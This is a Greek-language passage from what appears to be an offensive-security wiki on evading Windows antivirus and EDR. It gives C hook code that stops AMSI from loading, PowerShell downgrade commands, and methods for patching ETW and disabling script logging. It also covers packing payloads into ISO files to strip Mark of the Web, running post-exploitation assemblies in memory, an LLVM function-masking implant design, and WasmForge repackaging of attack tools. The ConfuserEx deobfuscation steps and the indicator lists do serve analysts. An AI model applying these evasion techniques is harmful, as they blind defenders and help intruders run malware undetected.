Περίγραμμα υλοποίησης (ψευδοκώδικας x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί με PowerShell, WScript/CScript και custom loaders (οτιδήποτε διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε το με την τροφοδότηση scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), για να αποφύγετε μεγάλα ίχνη στη γραμμή εντολών.
- Έχει χρησιμοποιηθεί από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για παράκαμψη του AMSI, το οποίο αποφεύγει τις υπογραφές χρησιμοποιώντας τυχαιοποιημένες συναρτήσεις που ορίζονται από τον χρήστη, μεταβλητές, εκφράσεις χαρακτήρων και τυχαία πεζά/κεφαλαία γράμματα στις λέξεις-κλειδιά του PowerShell.

**Αφαίρεση της ανιχνευμένης υπογραφής**

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη υπογραφή του AMSI από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο σαρώνει τη μνήμη της τρέχουσας διεργασίας για την υπογραφή του AMSI και στη συνέχεια την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση PowerShell έκδοσης 2**
Αν χρησιμοποιήσετε PowerShell έκδοσης 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PS

Η καταγραφή του PowerShell είναι μια δυνατότητα που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για τους επιτιθέμενους που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή του PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση του PowerShell Transcription και του Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρήση της έκδοσης 2 του PowerShell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση μιας μη διαχειριζόμενης συνεδρίας PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει τα μέτρα ελέγχου που συνδέονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Συσκότιση

> [!TIP]
> Αρκετές τεχνικές συσκότισης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και ίσως να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή χρειάζεται να παραμείνουν κρυφά.

### Αποσυσκότιση .NET Binaries που προστατεύονται από το ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να συναντήσετε πολλά επίπεδα προστασίας που εμποδίζουν τους decompilers και τα sandboxes. Η παρακάτω ροή εργασίας **αποκαθιστά αξιόπιστα ένα IL σχεδόν ίδιο με το αρχικό**, το οποίο στη συνέχεια μπορεί να απομεταγλωττιστεί σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1. Αφαίρεση Anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Επίσης, τροποποιεί το PE checksum, έτσι ώστε οποιαδήποτε αλλαγή να προκαλέσει κατάρρευση του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα κλειδιά XOR και να επανεγγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να φανούν χρήσιμες για τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – δώστε το *clean* αρχείο στο **de4dot-cex** (ένα fork του de4dot που υποστηρίζει ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – επιλογή του profile ConfuserEx 2
     • το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και variable names και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Proxy-call stripping – το ConfuserEx αντικαθιστά τις απευθείας κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*), για να δυσκολέψει περαιτέρω την αποσυμπίληση. Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς συναρτήσεις wrapper (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το δυαδικό αρχείο που προκύπτει στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload.  Συχνά το malware το αποθηκεύει ως πίνακα byte με κωδικοποίηση TLV, που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε σταθμό εργασίας χωρίς σύνδεση.

> 🛈  Το ConfuserEx δημιουργεί ένα προσαρμοσμένο attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Εντολή μίας γραμμής
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από αλλοίωση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για τη δημιουργία obfuscated code κατά τη μεταγλώττιση, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που δημιουργούνται από το C++ template metaprogramming framework, δυσκολεύοντας λίγο περισσότερο τη ζωή όποιου θέλει να κάνει crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα αρχεία PE, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζονται από το LLVM, το οποίο χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly code, μετατρέποντας τις κανονικές εντολές σε ROP chains, ανατρέποντας τη φυσική μας αντίληψη για την κανονική ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένας .NET PE Crypter γραμμένος σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

### Αυτο-απόκρυψη ανά συνάρτηση με τη βοήθεια του LLVM compiler

Αντί να γίνεται masking ολόκληρο το implant μόνο όταν βρίσκεται σε αδράνεια, ένα τροποποιημένο LLVM X86 backend μπορεί να κρατά επιλεγμένες συναρτήσεις XOR-masked όποτε είναι ανενεργές. Το PoC Function Peekaboo επιλέγει demangled ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό machine code και εκπέμπει έναν κοινό masking handler στο `.text`. Οι υπογραφές σε επίπεδο source και η calling convention των Windows x64 παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός της ροής ελέγχου στο backend

Αυτό πρέπει να γίνει μετά την επιλογή εντολών και τη βελτιστοποίηση, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε επιστροφή που εκπέμπεται** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο προσαρτημένο επίλογο και αντικαθιστά τις προηγούμενες επιστροφές με `JMP_1 handler`. Διατηρήστε οποιαδήποτε εκκαθάριση stack/frame έχει παραχθεί από τον compiler πριν από κάθε επιστροφή· ανακατευθύνετε μόνο την εντολή επιστροφής.<sup>[[38]](#references)[[39]](#references)</sup>

Τα `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stubs ανά συνάρτηση, ενώ το `emitEndOfAsmFile()` εκπέμπει τον handler. Τα σύμβολα που είναι κοινά μεταξύ των σταδίων εκπομπής επιτρέπουν σε έναν κλάδο prologue να στοχεύει τον μεταγενέστερο επίλογό του· για χειροκίνητα εκπεμπόμενο near `je`, γράψτε `0F 84` και έπειτα την τετρα-byte MC expression `target - address_after_je`. Οι κλήσεις και τα άλματα προς τον handler μπορούν εναλλακτικά να εκπέμπονται ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια μη επιλεγμένη συνάρτηση, αν δεν άλλαξε τίποτα· το PoC επιστρέφει λανθασμένα `true` σε αυτήν την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα XOR key και εγγραφές 16 byte, οι οποίες περιέχουν έναν function pointer που αναπροσαρμόζεται από τον loader και ένα runtime length, στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στη μετατόπιση `+8` της εγγραφής, καταναλώνοντας το length και τα bytes padding του, και προχωρά στις εγγραφές κατά `0x10`. Τα ονόματα των PE sections έχουν μέγεθος μόνο οκτώ byte, επομένως η αναζήτηση κατά το runtime βλέπει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει στο stub το παλιό entry-point RVA και ανακατευθύνει το `AddressOfEntryPoint`. Το PIC stub λαμβάνει το image base από το `gs:[0x60]` → `[PEB+0x10]`, διατρέχει τα PE32+ imports για να επιλύσει ένα ήδη εισαγμένο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση ορίζει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση metadata. Το prologue, που παραμένει μόνιμα αναγνώσιμο, καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει το sentinel και παραλείπει το σώμα που είναι ακόμη clear. Στη συνέχεια, ο επίλογος χρησιμοποιεί `call handler`· αφού ο handler αποθηκεύσει 13 registers (`0x68` byte), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της μετασχηματισμένης συνάρτησης, οπότε το `end - start` μπορεί να γραφτεί στην εγγραφή metadata της. Το stub εκκαθαρίζει το sentinel και μεταβαίνει στο `ImageBase + original_entry_point_RVA` αφού γίνει masking σε όλα τα σώματα.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη διάρκεια μιας κανονικής κλήσης, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή περνά στον προσαρτημένο επίλογο, ενώ κάθε προηγούμενη επιστροφή μεταβαίνει απευθείας στον κοινό handler. Ο κανονικός επίλογος χρησιμοποιεί επίσης `jmp handler` αντί για `call`, ώστε μετά το re-masking, το `ret` του handler να καταναλώνει τη διεύθυνση επιστροφής του αρχικού caller και να διατηρεί το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking και ενδείξεις ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερού μεγέθους ορατό prologue (`0x46` byte σε αυτό το build), αλλάζει το υπόλοιπο σε `PAGE_EXECUTE_READWRITE`, κάνει XOR σε κάθε byte με το χαμηλό byte του key και στη συνέχεια το ορίζει σε `PAGE_EXECUTE_READ`. Έτσι, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά κάθε κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Ενδείξεις υψηλής αξιοπιστίας για αυτόν τον σχεδιασμό είναι οι εξής:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point μέσα σε ένα εκτελέσιμο `.stub` και ένα section `.funcmet` που περιέχει ένα key και αναπροσαρμοσμένους δείκτες προς το `.text`·
- parsing των PEB, import table και section table πριν από το CRT, ακολουθούμενο από κλήσεις μέσω κάθε δείκτη metadata·
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά σημεία επιστροφής που ανακατευθύνονται σε έναν handler·
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες αλλαγές προστασίας μέσω `VirtualProtect` και εγγραφές XOR ανά byte σε εκτελέσιμες σελίδες που βασίζονται στο image.

Πρόκειται για αποφυγή memory scanner, όχι για κρυπτογραφική προστασία: το τροποποιημένο αρχείο εξακολουθεί να περιέχει το αρχικό clear body, ενώ ένας debugger μπορεί να σταματήσει στο `VirtualProtect` ή στον βρόχο XOR και να αποθηκεύσει τη συνάρτηση όσο είναι ενεργή. Το XOR ενός byte, τα αναγνώσιμα metadata και το σταθερό όριο `0x46` καθιστούν επίσης εύκολη την offline ανάκτηση.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Τα slots TEB του PoC είναι thread-local, αλλά οι τροποποιημένες code pages είναι process-wide. Επομένως, παράλληλες ή αναδρομικές είσοδοι μπορούν να αλλάξουν ξανά τις εντολές ενώ εκτελείται άλλη κλήση· εξαιρέσεις και μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το re-masking. Μια αξιόπιστη υλοποίηση πρέπει να συγχρονίζει τις αλλαγές, να επαναφέρει την προστασία που επιστράφηκε μέσω του `lpflOldProtect`, να αποφεύγει hard-coded μήκη stub, να ελέγχει τόσο τις διαδρομές `call` όσο και `jmp` για ευθυγράμμιση stack x64 και να καλεί το `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων byte. Η Microsoft αναθέτει ρητά στον caller την ευθύνη για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Ίσως να έχετε δει αυτήν την οθόνη όταν κατεβάζετε ορισμένα executables από το διαδίκτυο και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με προσέγγιση βασισμένη στη φήμη, πράγμα που σημαίνει ότι οι εφαρμογές που κατεβαίνουν σπάνια ενεργοποιούν το SmartScreen, το οποίο ειδοποιεί και εμποδίζει τον τελικό χρήστη να εκτελέσει το αρχείο (αν και το αρχείο μπορεί να εκτελεστεί επιλέγοντας More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με τη διεύθυνση URL από την οποία έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα executables που έχουν υπογραφεί με **έμπιστο** signing certificate **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να εμποδίσετε τα payloads σας να αποκτήσουν Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε containers εξόδου για να παρακάμψει το Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί ένα demo για την παράκαμψη του SmartScreen με τη συσκευασία payloads σε αρχεία ISO, χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, που επιτρέπει στις εφαρμογές και τα στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως ακριβώς απενεργοποιείται (παρακάμπτεται) το AMSI, είναι επίσης δυνατό η συνάρτηση **`EtwEventWrite`** της διεργασίας user space να επιστρέφει αμέσως χωρίς να καταγράφει συμβάντα. Αυτό γίνεται με την τροποποίηση της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Περισσότερες πληροφορίες θα βρείτε στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί έναν πολύ καλό τρόπο εκτέλεσης των post-exploitation tools σας χωρίς να εντοπιστείτε από το AV.

Καθώς το payload θα φορτωθεί απευθείας στη μνήμη, χωρίς να αγγίξει τον δίσκο, θα χρειαστεί να ανησυχήσουμε μόνο για την τροποποίηση του AMSI σε ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διάφοροι τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει τη **δημιουργία μιας νέας αναλώσιμης διεργασίας**, την εισαγωγή του κακόβουλου post-exploitation κώδικά σας σε αυτήν τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτή η μέθοδος έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι αν κάτι πάει στραβά κατά τη διάρκεια της post-exploitation ενέργειάς μας ή εντοπιστεί, οι πιθανότητες να **επιβιώσει το implant μας** είναι **πολύ μεγαλύτερες**. Το μειονέκτημα είναι ότι είναι **πιθανότερο** να εντοπιστείτε από **συμπεριφορικούς μηχανισμούς ανίχνευσης**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την εισαγωγή του κακόβουλου post-exploitation κώδικα **στη δική του διεργασία**. Έτσι, αποφεύγετε τη δημιουργία νέας διεργασίας και τον έλεγχό της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, είναι **πολύ πιθανότερο** να **χάσετε το beacon σας**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το BOF InlineExecute-Assembly τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Επανασυσκευασία εργαλείων .NET σε WebAssembly με NativeAOT (WasmForge)

Οι συνήθεις τεχνικές `execute-assembly` διατηρούν αναγνωρίσιμο MSIL και τελικά αρχικοποιούν ένα CLR. Το **WasmForge** αλλάζει το υπόβαθρο εκτέλεσης: μεταφέρει ένα C# project στον πειραματικό στόχο NativeAOT-LLVM WASI, το μεταγλωττίζει εκ των προτέρων σε WebAssembly και ενσωματώνει το module σε έναν Windows PE host βασισμένο στο Wazero. Η διεργασία που προκύπτει δεν χρειάζεται το CLR, το JIT ή το `dotnet` host του στόχου, επομένως οι κανόνες που βασίζονται μόνο σε ονόματα managed assemblies, φόρτωση CLR, AMSI ή .NET ETW χάνουν την άμεση ορατότητά τους. Πρόκειται για τεχνική παράκαμψης εντοπισμού/συσκευασίας και όχι για παράκαμψη ορίων προνομίων — ο guest διατηρεί τα αρχικά δικαιώματα του εργαλείου και την παρατηρήσιμη συμπεριφορά του στο λειτουργικό σύστημα.<sup>[[44]](#references)[[45]](#references)</sup>

### Δημιουργία ενός C# project

Η προτεινόμενη διαδικασία build είναι μέσω του Docker περιβάλλοντος του project, καθώς περιλαμβάνει το .NET 10 SDK, το NativeAOT-LLVM workload, το WASI SDK 24.0, τον linker και τις εξαρτήσεις υπογραφής. Ένα `.csproj` εντοπίζεται αυτόματα· το build με μία εντολή εκτελεί τη μετεγκατάσταση, τις διορθώσεις συμβατότητας, τη μεταγλώττιση WASM, τη δημιουργία του PE και την υπογραφή.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Για την αντιμετώπιση προβλημάτων ή την ανασκόπηση παραγόμενου κώδικα, χωρίστε τη διαδικασία σε `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` και, τέλος, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Το build image χρησιμοποιεί επίσης ένα wrapper `wasm-component-ld` για να αποφύγει την κωδικοποίηση component του WASI Preview 2 και να παράγει το απλό module που αναμένει το embedded runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Γεφύρωση wasm32 C# με x64 Win32

Αυτό δεν είναι διαφανής επαναμεταγλώττιση. Το NativeAOT-WASI δεν υποστηρίζει ή τροποποιεί λειτουργίες του BCL που προορίζονται για Windows, ενώ ένας wasm32 guest συνήθως δεσμεύει θέσεις pointer τεσσάρων byte, παρότι τα x64 APIs μπορούν να επιστρέψουν pointer οκτώ byte. Το WasmForge αντιμετωπίζει και τα δύο προβλήματα με τα εξής παραγόμενα επίπεδα:<sup>[[44]](#references)</sup>

1. Ένα source patcher διορθώνει σημασιολογικές διαφορές ειδικές για το AOT και ανακατευθύνει μη υποστηριζόμενες κλήσεις registry, pipes, WMI, identity, directory-service, file-version, LSA και παρόμοιες κλήσεις σε βοηθητικές συναρτήσεις `Wf*`.
2. Ένας σαρωτής P/Invoke παράγει αντιστοιχίσεις NativeAOT `DirectPInvoke`, ώστε οι κλήσεις `[DllImport]` να συνδέονται με συνδεδεμένα σύμβολα C bridge αντί να φορτώνουν δυναμικά το δηλωμένο DLL μέσα στον guest.
3. Τα host-bound pointers χρησιμοποιούν `ulong` στην C# και `uint64_t` στην C. Ένας generic dispatcher προωθεί την κλήση στον Win32 handler του host· ένα `out8_mask` επισημαίνει τις γνήσιες θέσεις εξόδου οκτώ byte των οποίων τα ανώτερα μισά πρέπει να διατηρηθούν. Για εξόδους χωρίς επισήμανση, διαμορφωμένες ως wasm32, χρησιμοποιείται προστασία snapshot/restore, ώστε μια εγγραφή x64 να μην καταστρέψει τα γειτονικά τέσσερα byte.
4. Ειδικά host bridges χειρίζονται λειτουργίες που δεν ταιριάζουν στη generic αποστολή syscall, όπως πρόσβαση στην cache εισιτηρίων LSA, λειτουργίες Kerberos/BCrypt με δομημένα αποτελέσματα, TCP κίνηση KDC και ερωτήματα LDAP.

